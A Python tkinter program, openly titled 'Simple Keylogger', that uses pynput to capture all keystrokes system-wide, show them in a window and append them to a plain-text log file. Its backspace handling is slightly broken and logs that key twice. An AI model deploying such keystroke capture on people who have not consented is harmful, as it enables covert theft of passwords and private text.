import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Keylogger")
        self.root.geometry("400x300")
        self.root.config(bg='white')
        
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, bg='white', fg='black', font=('Arial', 12))
        self.text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        self.log_file = open("keylog.txt", "a")
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

        self.shift_pressed = False
        self.ctrl_pressed = False
        self.caps_lock = False

    def on_press(self, key):
       
        try:
            if hasattr(key, 'char') and key.char is not None:

                char_to_log = key.char
                if self.shift_pressed or self.caps_lock:
                    char_to_log = char_to_log.upper() if key.char.isalpha() else char_to_log
                self.text_area.insert(tk.END, char_to_log)
                self.log_file.write(char_to_log)

            else:

                special_key_mapping = {
                    keyboard.Key.space: "[SPACE]",
                    keyboard.Key.enter: "[ENTER]",
                    keyboard.Key.esc: "[ESC]",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.caps_lock: "[CAPS LOCK]",
                    keyboard.Key.ctrl: "[CTRL]",
                    keyboard.Key.shift: "[SHIFT]",
                    keyboard.Key.backspace: "[BACKSPACE]",
                }

                if key in special_key_mapping:
                    if key == keyboard.Key.caps_lock:
                        self.caps_lock = not self.caps_lock  
                    elif key == keyboard.Key.shift:
                        self.shift_pressed = True  
                    elif key == keyboard.Key.ctrl:
                        self.ctrl_pressed = True  
                    else:
                        self.text_area.insert(tk.END, special_key_mapping[key])
                        self.log_file.write(special_key_mapping[key])

                if key == keyboard.Key.backspace:
                    current_text = self.text_area.get("1.0", tk.END)
                    if current_text and current_text.strip():  
                        self.text_area.delete("end-1c")
                    self.log_file.write("[BACKSPACE]")

        except Exception as e:
            print(f"Error: {e}")

        self.text_area.see(tk.END)

    def on_release(self, key):

        if key == keyboard.Key.shift:
            self.shift_pressed = False
        elif key == keyboard.Key.ctrl:
            self.ctrl_pressed = False

    def on_closing(self):
        self.listener.stop()
        self.log_file.close()
        self.root.destroy()

root = tk.Tk()
app = KeyloggerApp(root)
root.protocol("WM_DELETE_WINDOW", app.on_closing)

root.mainloop()
